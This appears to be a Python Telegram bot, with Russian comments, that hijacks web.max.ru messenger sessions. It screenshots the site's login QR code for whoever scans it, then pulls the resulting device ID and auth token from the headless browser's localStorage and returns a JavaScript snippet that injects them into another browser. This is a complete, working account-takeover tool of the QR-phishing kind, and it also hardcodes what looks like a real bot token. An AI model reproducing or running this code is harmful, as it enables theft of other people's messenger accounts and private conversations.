"""
Telegram бот для max.ru - ФАЙЛОВАЯ ВЕРСИЯ
"""

import logging
import asyncio
from io import BytesIO
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import os
import time
import json

# ТОКЕН
TOKEN = "8294429332:AAEQsLd2ZnGM0Z12arZjQZmVK38X1-tJEXY"
URL = "https://web.max.ru"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

driver = None
user_sessions = {}

def get_driver():
    global driver
    if not driver:
        options = Options()
        options.add_argument('--headless')
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--window-size=1920x1080')
        driver = webdriver.Chrome(options=options)
    return driver

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Бот для max.ru**\n\n"
        "1️⃣ **/qr** - получить скриншот\n"
        "2️⃣ Отсканируй QR\n"
        "3️⃣ **/file** - получить result.txt\n\n"
        "✅ После /file придет файл со скриптом",
        parse_mode='Markdown'
    )

async def qr_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = str(update.effective_user.id)
    
    msg = await update.message.reply_text("🔄 Загружаю страницу...")
    
    try:
        driver = get_driver()
        driver.get(URL)
        await msg.edit_text("⏳ Жду загрузки...")
        time.sleep(15)
        
        screenshot = driver.get_screenshot_as_png()
        img_io = BytesIO(screenshot)
        img_io.name = "page.png"
        
        await msg.delete()
        await update.message.reply_photo(
            photo=InputFile(img_io, filename="page.png"),
            caption="📸 **Скриншот готов**\n\n"
                    "1️⃣ Найди QR\n"
                    "2️⃣ Отсканируй\n"
                    "3️⃣ Войди\n"
                    "4️⃣ **/file**",
            parse_mode='Markdown'
        )
        
        user_sessions[user_id] = True
        logger.info(f"Сессия создана для {user_id}")
        
    except Exception as e:
        logger.error(f"Ошибка: {e}")
        await msg.edit_text(f"❌ Ошибка: {e}")

async def file_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Отправка файла .txt"""
    user_id = str(update.effective_user.id)
    
    if user_id not in user_sessions:
        await update.message.reply_text("❌ Сначала используй /qr")
        return
    
    msg = await update.message.reply_text("🔄 Получаю данные...")
    
    try:
        # Получаем данные из браузера
        data = driver.execute_script("""
            return {
                deviceId: localStorage.getItem('__oneme_device_id'),
                auth: localStorage.getItem('__oneme_auth')
            };
        """)
        
        if data and data['deviceId'] and data['auth']:
            # Формируем скрипт
            device_id = data['deviceId']
            auth = data['auth']
            
            script = f"sessionStorage.clear();localStorage.clear();localStorage.setItem('__oneme_device_id', '{device_id}');localStorage.setItem('__oneme_auth', {auth});window.location.reload();"
            
            # СОЗДАЕМ ФАЙЛ .txt
            file_bytes = BytesIO(script.encode('utf-8'))
            file_bytes.name = "result.txt"
            
            await msg.delete()
            
            # ОТПРАВЛЯЕМ ФАЙЛ
            await update.message.reply_document(
                document=InputFile(file_bytes, filename="result.txt"),
                caption="✅ **Файл готов!**"
            )
            
            logger.info(f"Файл отправлен пользователю {user_id}")
            
            # Удаляем сессию
            del user_sessions[user_id]
            
        else:
            await msg.edit_text(
                "❌ **Вход не выполнен**\n\n"
                "1️⃣ Проверь что ты отсканировал QR\n"
                "2️⃣ Подтверди вход на сайте\n"
                "3️⃣ Попробуй **/file** еще раз",
                parse_mode='Markdown'
            )
            
    except Exception as e:
        logger.error(f"Ошибка в file: {e}")
        await msg.edit_text(f"❌ Ошибка: {e}")

async def main():
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("qr", qr_command))
    app.add_handler(CommandHandler("file", file_command))  # Команда /file
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling()
    
    logger.info("✅ Бот запущен! Используй /qr и /file")
    
    while True:
        await asyncio.sleep(1)

if __name__ == "__main__":
    asyncio.run(main())
